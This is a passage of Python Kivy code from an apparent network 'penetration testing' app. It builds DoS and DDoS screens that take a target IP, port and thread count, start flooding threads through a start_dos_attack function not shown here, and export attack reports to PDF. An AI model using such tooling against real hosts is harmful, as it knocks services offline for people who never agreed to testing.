    def export_results(self, instance):
        if hasattr(self, 'info') and self.info.text and self.info.text != "DoS Output...":
            try:
                elapsed = time.time() - self.start_time if hasattr(self, "start_time") else 0
                total_packets = self.packet_counter[0] if hasattr(self, "packet_counter") else "N/A"
                extra_info = f"\n\n[Report Summary]\nTotal Packets Sent: {total_packets}\nAttack Duration: {elapsed:.2f} seconds"
                full_report = self.info.text + extra_info
                filename = export_to_pdf(full_report, "dos_attack")
                self.info.text += f"\n[+] Report exported to {filename}"
            except Exception as e:
                self.info.text += f"\n[-] Failed to export report: {e}"
        else:
            self.info.text += "\n[-] No results to export"

class DOSAttackScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.stop_event = threading.Event()
        self.packet_counter = [0]
        self.update_event = None

        layout = FloatLayout()

        # Background
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)

        # Glass content container
        content = BoxLayout(
            orientation="vertical",
            spacing=10,
            padding=20,
            size_hint=(0.6, 0.9),
            pos_hint={"center_x": 0.5, "center_y": 0.5},
        )

        # Output field
        self.info = TextInput(
            text="DoS Output...",
            readonly=True,
            size_hint=(1, 0.4),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.info)

        # Inputs
        self.target_input = TextInput(
            hint_text="Enter target IP",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.port_input = TextInput(
            hint_text="Enter target port (default 80)",
            input_filter="int",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        content.add_widget(self.target_input)
        content.add_widget(self.port_input)

        # Buttons
        start_btn = GlassButton(text="Start DoS Attack", size_hint=(1, 0.1))
        start_btn.bind(on_press=self.start_dos)
        content.add_widget(start_btn)

        stop_btn = GlassButton(text="Stop DoS Attack", size_hint=(1, 0.1))
        stop_btn.color = (1, 0, 0, 1)
        stop_btn.bind(on_press=self.stop_dos)
        content.add_widget(stop_btn)

        export_btn = GlassButton(text="Export PDF", size_hint=(1, 0.1))
        export_btn.bind(on_press=self.export_results)
        content.add_widget(export_btn)

        back_btn = GlassButton(text="Back", size_hint=(1, 0.1))
        back_btn.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        content.add_widget(back_btn)

        layout.add_widget(content)
        self.add_widget(layout)

    def start_dos(self, instance):
        target = self.target_input.text.strip()
        try:
            port = int(self.port_input.text.strip())
        except ValueError:
            port = 80

        if not target:
            self.info.text += "\n[-] Target IP required."
            return

        self.packet_counter[0] = 0
        self.stop_event.clear()
        self.start_time = time.time()  # Initialize start_time

        self.update_event = Clock.schedule_interval(self.update_output, 1)

        threading.Thread(
            target=start_dos_attack,
            args=(target, port, 10, self.stop_event, self),
            daemon=True,
        ).start()

        self.info.text = f"[*] DoS attack started against {target}:{port}"

    def stop_dos(self, instance):
        self.stop_event.set()
        if self.update_event:
            Clock.unschedule(self.update_event)
        self.info.text += "\n[*] DoS attack stopped."

    def update_output(self, dt):
        self.info.text += f"\n[+] Performing Attack - Sending Packets : {self.packet_counter[0]}"

    def export_results(self, instance):
        if hasattr(self, 'info') and self.info.text and self.info.text != "DoS Output...":
            try:
                if hasattr(self, "start_time"):
                    elapsed = time.time() - self.start_time
                else:
                    elapsed = 0
                
                total_packets = self.packet_counter[0] if hasattr(self, "packet_counter") else "N/A"
                
                extra_info = f"\n\n[Report Summary]\nTotal Packets Sent: {total_packets}\nAttack Duration: {elapsed:.2f} seconds"
                full_report = self.info.text + extra_info
                
                filename = export_to_pdf(full_report, "dos_attack")
                self.info.text += f"\n[+] Report exported to {filename}"
            except Exception as e:
                self.info.text += f"\n[-] Failed to export report: {e}"
        else:
            self.info.text += "\n[-] No results to export"

class DDoSAttackScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.stop_event = threading.Event()
        self.packet_counter = [0]
        self.update_event = None
        self.start_time = None
        self.attack_target = None
        self.attack_port = None

        layout = FloatLayout()

        # Background
        bg = Image(
            source="assets/bg.jpg",
            fit_mode="cover",
            size_hint=(1, 1),
            pos_hint={"x": 0, "y": 0},
        )
        layout.add_widget(bg)

        # Content container
        content = BoxLayout(
            orientation="vertical",
            spacing=10,
            padding=20,
            size_hint=(0.6, 0.9),
            pos_hint={"center_x": 0.5, "center_y": 0.5},
        )

        # Output display
        self.info = TextInput(
            text="DDoS Output...",
            readonly=True,
            size_hint=(1, 0.4),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )
        content.add_widget(self.info)

        # Input fields
        self.target_input = TextInput(
            hint_text="Enter target IP",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.port_input = TextInput(
            hint_text="Enter target port (default 80)",
            input_filter="int",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        self.threads_input = TextInput(
            hint_text="Number of threads (e.g., 100)",
            input_filter="int",
            size_hint=(1, 0.1),
            background_color=(1, 1, 1, 0.1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.7, 0.7, 0.7, 1),
            font_size=18,
        )

        content.add_widget(self.target_input)
        content.add_widget(self.port_input)
        content.add_widget(self.threads_input)

        # Buttons
        start_btn = GlassButton(text="Start DDoS Attack", size_hint=(1, 0.1))
        start_btn.bind(on_press=self.start_ddos)
        content.add_widget(start_btn)

        stop_btn = GlassButton(text="Stop DDoS Attack", size_hint=(1, 0.1))
        stop_btn.color = (1, 0, 0, 1)
        stop_btn.bind(on_press=self.stop_ddos)
        content.add_widget(stop_btn)

        export_btn = GlassButton(text="Export PDF", size_hint=(1, 0.1))
        export_btn.bind(on_press=self.export_results)
        content.add_widget(export_btn)

        back_btn = GlassButton(text="Back", size_hint=(1, 0.1))
        back_btn.bind(on_press=lambda x: setattr(self.manager, "current", "main"))
        content.add_widget(back_btn)

        layout.add_widget(content)
        self.add_widget(layout)

    def start_ddos(self, instance):
        target = self.target_input.text.strip()
        try:
            port = int(self.port_input.text.strip())
        except ValueError:
            port = 80

        try:
            threads = int(self.threads_input.text.strip())
        except ValueError:
            threads = 100

        if not target:
            self.info.text += "\n[-] Target IP required."
            return

        self.packet_counter[0] = 0
        self.stop_event.clear()
        self.start_time = time.time()
        self.attack_target = target
        self.attack_port = port

        self.update_event = Clock.schedule_interval(self.update_output, 1)

        for _ in range(threads):
            threading.Thread(
                target=start_dos_attack,
                args=(target, port, 1, self.stop_event, self),
                daemon=True,
            ).start()

        self.info.text = f"[*] DDoS attack started on {target}:{port} with {threads} threads."

    def stop_ddos(self, instance):
        self.stop_event.set()
        if self.update_event:
            Clock.unschedule(self.update_event)
        self.info.text += "\n[*] DDoS attack stopped."

    def update_output(self, dt):
        self.info.text += f"\n[+] Performing Attack - Sending Packets: {self.packet_counter[0]}"

    def export_results(self, instance):
        if hasattr(self, 'info') and self.info.text and self.info.text != "DDoS Output...":
            try:
                elapsed = time.time() - self.start_time if self.start_time else 0
                total_packets = self.packet_counter[0]
                target = self.attack_target or "Unknown"
                port = self.attack_port or "Unknown"
                extra_info = (
                    f"\n\n[Report Summary]"
                    f"\nTarget: {target}:{port}"
                    f"\nTotal Packets Sent: {total_packets}"
                    f"\nAttack Duration: {elapsed:.2f} seconds"
                )
                full_report = self.info.text + extra_info
                filename = export_to_pdf(full_report, "ddos_attack")
                self.info.text += f"\n[+] Report exported to {filename}"
            except Exception as e:
                self.info.text += f"\n[-] Failed to export report: {e}"
        else:
            self.info.text += "\n[-] No results to export"


# =============================
# PDF EXPORT FUNCTION
# =============================
def export_to_pdf(content, report_type):
    """Export text content to a PDF file"""
    if not os.path.exists("reports"):
        os.makedirs("reports")

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"reports/{report_type}_report_{timestamp}.pdf"

    doc = SimpleDocTemplate(filename, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    title = f"{report_type.capitalize()} Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    story.append(Paragraph(title, styles['Title']))

    for line in content.split('\n'):
        if line.strip():
            line = line.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            story.append(Paragraph(line, styles['Normal']))

    doc.build(story)
    return filename

# =============================
# MAIN APP
# =============================
class Automated_Network_Penetration_Testing(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MainScreen(name="main"))
        sm.add_widget(ScanningScreen(name="scanning"))
        sm.add_widget(ARPSpoofScreen(name="arp"))
        sm.add_widget(DOSAttackScreen(name="dos"))
        sm.add_widget(DDoSAttackScreen(name="ddos"))
        return sm


if __name__ == "__main__":
    Automated_Network_Penetration_Testing().run()
